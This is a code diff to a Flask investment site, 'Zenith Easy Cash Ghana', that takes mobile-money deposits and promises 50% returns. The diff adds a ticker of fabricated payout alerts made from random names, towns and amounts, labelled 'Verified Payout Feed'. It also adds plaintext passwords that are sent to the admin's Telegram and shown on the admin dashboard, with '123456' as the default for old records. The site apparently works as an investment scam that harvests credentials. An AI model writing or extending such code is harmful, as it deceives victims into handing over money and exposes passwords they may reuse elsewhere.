@@ -113,30 +113,54 @@ def save_investor_data(data):
   save_all_investors(investors)
 
 
-# --- SPORTYBET / AVIATOR STYLE POPUP NOTIFICATION COMPONENT (RIGHT TO LEFT) ---
-SPORTYBET_POPUP_HTML = """
+# --- TOP BANNER TICKER FOR REGISTRATION PAGE (RIGHT TO LEFT) ---
+ZENITH_ALERTS_TOP_HTML = """
 <style>
-    #sportyToastContainer {
-        position: fixed; bottom: 20px; right: 20px; z-index: 99999;
-        display: flex; flex-direction: column; gap: 10px; pointer-events: none;
+    #zenithAlertsBanner {
+        background: linear-gradient(135deg, #0b130b, #132e13);
+        border-bottom: 2px solid #00ff66;
+        color: #fff;
+        padding: 10px 15px;
+        margin-bottom: 20px;
+        border-radius: 6px;
+        box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+        font-family: Arial, sans-serif;
+        overflow: hidden;
+        position: relative;
     }
-    .sporty-toast {
-        background: linear-gradient(135deg, #111b11, #1e3a1e);
-        border-left: 4px solid #00ff66; color: #fff; padding: 12px 16px;
-        border-radius: 8px; box-shadow: 0 6px 20px rgba(0,0,0,0.6);
-        width: 300px; font-family: Arial, sans-serif; pointer-events: auto;
-        transform: translateX(120%); transition: transform 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.6s ease;
+    .alerts-header {
+        font-size: 11px;
+        color: #00ff66;
+        font-weight: bold;
+        text-transform: uppercase;
+        margin-bottom: 4px;
+        display: flex;
+        justify-content: space-between;
+    }
+    .alerts-content {
+        font-size: 13px;
+        line-height: 1.4;
+        transform: translateX(100%);
         opacity: 0;
+        transition: transform 0.8s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.8s ease;
+        white-space: nowrap;
+        overflow: hidden;
+        text-overflow: ellipsis;
     }
-    .sporty-toast.show {
-        transform: translateX(0); opacity: 1;
+    .alerts-content.show {
+        transform: translateX(0);
+        opacity: 1;
     }
-    .sporty-header { display: flex; justify-content: space-between; font-size: 11px; color: #00ff66; font-weight: bold; margin-bottom: 3px; text-transform: uppercase; }
-    .sporty-body { font-size: 13px; line-height: 1.3; color: #f3f4f6; }
-    .sporty-body b { color: #facc15; }
+    .alerts-content b { color: #facc15; }
 </style>
 
-<div id="sportyToastContainer"></div>
+<div id="zenithAlertsBanner">
+    <div class="alerts-header">
+        <span>🟢 Live Zenith Alerts</span>
+        <span>Verified Payout Feed</span>
+    </div>
+    <div id="alertsText" class="alerts-content">Connecting to Zenith secure payout stream...</div>
+</div>
 
 <script>
     const ghanaNames = [
@@ -150,13 +174,13 @@ SPORTYBET_POPUP_HTML = """
     const roundInvestments = [300, 400, 500, 600, 800, 1000, 1500, 2000, 3000, 4000, 5000, 10000];
     const roundBonuses = [50, 100, 150, 200, 300, 400, 500, 800, 1000, 1500, 2000];
 
-    function showSportyToast() {
-        const container = document.getElementById('sportyToastContainer');
-        if (!container) return;
+    function rotateZenithAlerts() {
+        const el = document.getElementById('alertsText');
+        if (!el) return;
 
         const name = ghanaNames[Math.floor(Math.random() * ghanaNames.length)];
         const town = towns[Math.floor(Math.random() * towns.length)];
-        const isBonus = Math.random() < 0.3; // 30% chance for bonus payout
+        const isBonus = Math.random() < 0.3;
 
         let rewardText = "";
         if (!isBonus) {
@@ -168,24 +192,16 @@ SPORTYBET_POPUP_HTML = """
             rewardText = `<b>Bonus Payout (GHs ${bonusAmt.toLocaleString()})</b>`;
         }
 
-        const toast = document.createElement('div');
-        toast.className = 'sporty-toast';
-        toast.innerHTML = `
-            <div class="sporty-header"><span>⚡ Live Payout Alert</span><span>Just Now</span></div>
-            <div class="sporty-body"><b>${name}</b> (${town}) won & cashed out ${rewardText} via MoMo!</div>
-        `;
-
-        container.appendChild(toast);
-        setTimeout(() => toast.classList.add('show'), 50);
+        el.classList.remove('show');
 
         setTimeout(() => {
-            toast.classList.remove('show');
-            setTimeout(() => toast.remove(), 600);
-        }, 4500);
+            el.innerHTML = `<b>${name}</b> (${town}) just cashed out ${rewardText} via MoMo!`;
+            el.classList.add('show');
+        }, 300);
     }
 
-    setInterval(showSportyToast, 5000);
-    setTimeout(showSportyToast, 1200);
+    setInterval(rotateZenithAlerts, 6000);
+    setTimeout(rotateZenithAlerts, 500);
 </script>
 """
 
@@ -227,10 +243,10 @@ POPUP_MODAL_CSS = """
         <h3>{{ modal_title }}</h3>
         <p>{{ modal_desc|safe }}</p>
         <a href="{{ admin_telegram_link }}" target="_blank" class="modal-btn telegram-quick-btn">💬 Chat Admin on Telegram for Quick Approval</a>
-        <button class="modal-btn" onclick="closeModal()" style="background: #444; margin-top: 8px;">Continue</button>
+        <button class="modal-btn" onclick="closeModal()" style="background: #444; margin-top: 8px;">Continue to Login</button>
     </div>
 </div>
-<script>function closeModal() { document.getElementById('successModal').style.display = 'none'; }</script>
+<script>function closeModal() { window.location.href = "{{ url_for('login') }}"; }</script>
 """
 
 HTML_TEMPLATE = """
@@ -259,8 +275,8 @@ HTML_TEMPLATE = """
     </style>
 </head>
 <body>
-    {{ sporty_toast_html|safe }}
     <div class="container">
+        {{ zenith_alerts_top_html|safe }}
         <h2>Zenith Easy Cash Ghana</h2>
         <h3>Online Investor Registration & Portal</h3>
 
@@ -292,6 +308,10 @@ HTML_TEMPLATE = """
             <div class="form-group">
                 <label>Phone Number (Used for Login):</label>
                 <input type="text" name="number" required placeholder="e.g., 0501234567">
+            </div>
+            <div class="form-group">
+                <label>Account Password:</label>
+                <input type="password" name="password" required placeholder="Create a secure login password">
             </div>
             <div class="form-group">
                 <label>Investment Amount (GHs):</label>
@@ -350,13 +370,14 @@ INVESTOR_LOGIN_TEMPLATE = """
         .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
         .back { text-align: center; margin-top: 15px; }
         .back a { color: #028a0f; text-decoration: none; font-weight: bold; font-size: 14px; }
+        .help-support { text-align: center; margin-top: 10px; font-size: 13px; color: #666; }
+        .help-support a { color: #0088cc; text-decoration: none; font-weight: bold; }
     </style>
 </head>
 <body>
-    {{ sporty_toast_html|safe }}
     <div class="container">
         <h2>Investor Portal Login</h2>
-        <p style="text-align: center; color: #666; font-size: 13px; margin-bottom: 20px;">Access your personal dashboard using your registered phone number.</p>
+        <p style="text-align: center; color: #666; font-size: 13px; margin-bottom: 20px;">Access your profile securely from any browser.</p>
         
         {% with messages = get_flashed_messages() %}
           {% if messages %}
@@ -369,8 +390,17 @@ INVESTOR_LOGIN_TEMPLATE = """
                 <label>Phone Number:</label>
                 <input type="text" name="number" required placeholder="e.g., 0501234567">
             </div>
+            <div class="form-group">
+                <label>Password:</label>
+                <input type="password" name="password" required placeholder="Enter your password">
+            </div>
             <button type="submit">Login to Dashboard</button>
         </form>
+
+        <div class="help-support">
+            Forgot password? <a href="{{ admin_telegram_link }}" target="_blank">Contact Admin on Telegram</a>
+        </div>
+
         <div class="back">
             <a href="{{ url_for('index') }}">← Back to Home</a>
         </div>
@@ -403,14 +433,11 @@ INVESTOR_DASHBOARD_TEMPLATE = """
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .countdown-box { background: #fffbeb; border: 1px solid #f59e0b; padding: 10px; border-radius: 6px; margin-top: 10px; text-align: center; color: #b45309; font-weight: bold; font-size: 13px; }
         .flash { background: #ffebee; color: #c62828; padding: 10px; margin-bottom: 15px; border-radius: 4px; text-align: center; }
-        
-        /* Sidebar Side Ticker items */
         .side-ticker-item { background: #1e293b; border-left: 3px solid #00ff66; padding: 10px; margin-bottom: 10px; border-radius: 4px; font-size: 12px; }
         .side-ticker-item b { color: #facc15; }
     </style>
 </head>
 <body>
-    {{ sporty_toast_html|safe }}
     <div class="main-layout">
         <div class="dashboard-container">
             <div>
@@ -475,12 +502,9 @@ INVESTOR_DASHBOARD_TEMPLATE = """
             {% endif %}
         </div>
 
-        <!-- Sidebar Live Zenith Withdrawals -->
         <div class="sidebar-ticker">
             <h3 style="color: #00ff66; font-size: 15px; margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 8px;">🟢 Live Zenith Withdrawals</h3>
-            <div id="sideTickerList">
-                <!-- Dynamically injected feeds -->
-            </div>
+            <div id="sideTickerList"></div>
         </div>
     </div>
 
@@ -533,7 +557,7 @@ INVESTOR_DASHBOARD_TEMPLATE = """
                 list.lastChild.remove();
             }
         }
-        setInterval(addSideTickerItem, 4000);
+        setInterval(addSideTickerItem, 5000);
         addSideTickerItem();
         addSideTickerItem();
     </script>
@@ -564,7 +588,6 @@ ADMIN_LOGIN_TEMPLATE = """
     </style>
 </head>
 <body>
-    {{ sporty_toast_html|safe }}
     <div class="container">
         <h2>Admin Authentication</h2>
         {% with messages = get_flashed_messages() %}
@@ -608,12 +631,11 @@ ADMIN_DASHBOARD_TEMPLATE = """
         .status-pending { color: #e65100; font-weight: bold; }
         .clear { clear: both; }
         img.proof-thumb { width: 50px; height: 50px; object-fit: cover; border-radius: 4px; border: 1px solid #ccc; cursor: pointer; }
-        .edit-time-form { display: flex; gap: 5px; margin-top: 5px; align-items: center; }
-        .edit-time-form input { padding: 4px; font-size: 11px; width: 120px; }
+        .edit-form { display: flex; gap: 4px; margin-top: 4px; align-items: center; }
+        .edit-form input { padding: 4px; font-size: 11px; width: 110px; }
     </style>
 </head>
 <body>
-    {{ sporty_toast_html|safe }}
     <div class="container">
         <div>
             <h2>Admin Dashboard</h2>
@@ -638,15 +660,16 @@ ADMIN_DASHBOARD_TEMPLATE = """
             </form>
         </div>
 
-        <h3>Registered Investors & Active Accounts Management</h3>
+        <h3>Registered Investors & Password Retrieval Management</h3>
         <table>
             <thead>
                 <tr>
                     <th>Name / Number</th>
+                    <th>Password Management</th>
                     <th>Capital & Proof</th>
                     <th>Job / Region</th>
                     <th>Registered</th>
-                    <th>Maturity Time & Date (Editable)</th>
+                    <th>Maturity Time</th>
                     <th>Status</th>
                     <th>Actions</th>
                 </tr>
@@ -656,6 +679,13 @@ ADMIN_DASHBOARD_TEMPLATE = """
                     {% for idx, inv in enumerate(investors) %}
                     <tr>
                         <td><strong>{{ inv.name }}</strong><br>{{ inv.number }}</td>
+                        <td>
+                            <span><b>Pass:</b> {{ inv.password }}</span>
+                            <form action="{{ url_for('update_password', index=idx) }}" method="POST" class="edit-form">
+                                <input type="text" name="new_password" placeholder="New pass" required>
+                                <button type="submit" class="btn-action" style="background:#0284c7;">Reset</button>
+                            </form>
+                        </td>
                         <td>
                             <strong>{{ inv.amount }} GHs</strong><br>
                             <small style="color:#028a0f;">Return: {{ inv.expected_return }} GHs</small><br>
@@ -670,9 +700,9 @@ ADMIN_DASHBOARD_TEMPLATE = """
                         <td>{{ inv.date_time }}</td>
                         <td>
                             <span>{{ inv.maturity_date }}</span>
-                            <form action="{{ url_for('update_maturity', index=idx) }}" method="POST" class="edit-time-form">
+                            <form action="{{ url_for('update_maturity', index=idx) }}" method="POST" class="edit-form">
                                 <input type="text" name="new_maturity" value="{{ inv.maturity_date }}" required title="Format: YYYY-MM-DD HH:MM:SS">
-                                <button type="submit" class="btn-action" style="background:#0284c7;">Set Time</button>
+                                <button type="submit" class="btn-action" style="background:#0284c7;">Set</button>
                             </form>
                         </td>
                         <td><span class="status-pending">{{ inv.status }}</span></td>
@@ -697,7 +727,7 @@ ADMIN_DASHBOARD_TEMPLATE = """
                     {% endfor %}
                 {% else %}
                     <tr>
-                        <td colspan="7" style="text-align: center; color: #666;">No investor registrations found yet.</td>
+                        <td colspan="8" style="text-align: center; color: #666;">No investor registrations found yet.</td>
                     </tr>
                 {% endif %}
             </tbody>
@@ -719,6 +749,11 @@ def index():
       amount = float(request.form["amount"])
       if amount < 200 or amount > 500000:
         flash("Investment amount must be between 200 GHs and 500,000 GHs.")
+        return redirect(url_for("index"))
+
+      password = request.form.get("password", "").strip()
+      if not password:
+        flash("Please provide a secure account password.")
         return redirect(url_for("index"))
 
       transaction_id = request.form.get("transaction_id", "").strip()
@@ -745,6 +780,7 @@ def index():
       investor_data = {
           "name": request.form["name"],
           "number": request.form["number"].strip(),
+          "password": password,
           "amount": amount,
           "expected_return": expected_return,
           "work": request.form["work"],
@@ -764,6 +800,7 @@ def index():
           f"🚨 <b>NEW INVESTMENT REGISTRATION</b>\n\n"
           f"👤 <b>Name:</b> {investor_data['name']}\n"
           f"📞 <b>Number:</b> {investor_data['number']}\n"
+          f"🔑 <b>Password:</b> {investor_data['password']}\n"
           f"💰 <b>Capital:</b> GHs {investor_data['amount']}\n"
           f"📈 <b>Expected Return (50%):</b> GHs {investor_data['expected_return']}\n"
           f"🧾 <b>Proof:</b> {investor_data['transaction_id']}\n"
@@ -779,7 +816,7 @@ def index():
       send_telegram_alert(alert_msg, photo_path)
 
       modal_title = "Successfully Registered!"
-      modal_desc = f"Your investment of <b>GHs {amount:,.2f}</b> (Expected 50% Return: <b>GHs {expected_return:,.2f}</b>) has been submitted.<br>Click below to message the admin on Telegram for instant approval!"
+      modal_desc = f"Your investment of <b>GHs {amount:,.2f}</b> has been submitted successfully.<br>You can now log in from any browser using your phone number and password."
       popup_html = (
           POPUP_MODAL_CSS.replace("{{ modal_title }}", modal_title)
           .replace("{{ modal_desc }}", modal_desc)
@@ -792,7 +829,7 @@ def index():
           show_modal=True,
           popup_html=popup_html,
           admin_telegram_link=ADMIN_TELEGRAM_LINK,
-          sporty_toast_html=SPORTYBET_POPUP_HTML,
+          zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
       )
 
     except ValueError:
@@ -804,7 +841,7 @@ def index():
       settings=settings,
       show_modal=False,
       admin_telegram_link=ADMIN_TELEGRAM_LINK,
-      sporty_toast_html=SPORTYBET_POPUP_HTML,
+      zenith_alerts_top_html=ZENITH_ALERTS_TOP_HTML,
   )
 
 
@@ -812,17 +849,24 @@ def index():
 def login():
   if request.method == "POST":
     number = request.form.get("number", "").strip()
+    password = request.form.get("password", "").strip()
     investors = load_investors()
-    found = any(inv.get("number") == number for inv in investors)
+    
+    found = False
+    for inv in investors:
+      if inv.get("number") == number and inv.get("password") == password:
+        found = True
+        break
+
     if found:
       session["investor_number"] = number
       return redirect(url_for("dashboard"))
     else:
-      flash("No account found with this phone number.")
+      flash("Invalid phone number or password.")
       return redirect(url_for("login"))
 
   return render_template_string(
-      INVESTOR_LOGIN_TEMPLATE, sporty_toast_html=SPORTYBET_POPUP_HTML
+      INVESTOR_LOGIN_TEMPLATE, admin_telegram_link=ADMIN_TELEGRAM_LINK
   )
 
 
@@ -863,7 +907,6 @@ def dashboard():
       investors=investors_found,
       investor_name=investor_name,
       admin_telegram_link=ADMIN_TELEGRAM_LINK,
-      sporty_toast_html=SPORTYBET_POPUP_HTML,
   )
 
 
@@ -965,9 +1008,7 @@ def admin_login():
       flash("Incorrect admin password.")
       return redirect(url_for("admin_login"))
 
-  return render_template_string(
-      ADMIN_LOGIN_TEMPLATE, sporty_toast_html=SPORTYBET_POPUP_HTML
-  )
+  return render_template_string(ADMIN_LOGIN_TEMPLATE)
 
 
 @app.route("/admin-dashboard")
@@ -979,6 +1020,8 @@ def admin_dashboard():
   for inv in investors:
     if "expected_return" not in inv:
       inv["expected_return"] = inv["amount"] * 1.5
+    if "password" not in inv:
+      inv["password"] = "123456" # Fallback for old records
 
   settings = load_settings()
   return render_template_string(
@@ -986,7 +1029,6 @@ def admin_dashboard():
       investors=investors,
       settings=settings,
       enumerate=enumerate,
-      sporty_toast_html=SPORTYBET_POPUP_HTML,
   )
 
 
@@ -1041,6 +1083,21 @@ def update_maturity(index):
       investors[index]["maturity_date"] = new_time
       save_all_investors(investors)
       flash("Investment maturity time successfully updated!")
+  return redirect(url_for("admin_dashboard"))
+
+
+@app.route("/admin/update-password/<int:index>", methods=["POST"])
+def update_password(index):
+  if not session.get("admin_logged_in"):
+    return redirect(url_for("admin_login"))
+
+  investors = load_investors()
+  if 0 <= index < len(investors):
+    new_pass = request.form.get("new_password", "").strip()
+    if new_pass:
+      investors[index]["password"] = new_pass
+      save_all_investors(investors)
+      flash("Investor password successfully updated!")
   return redirect(url_for("admin_dashboard"))
 
 
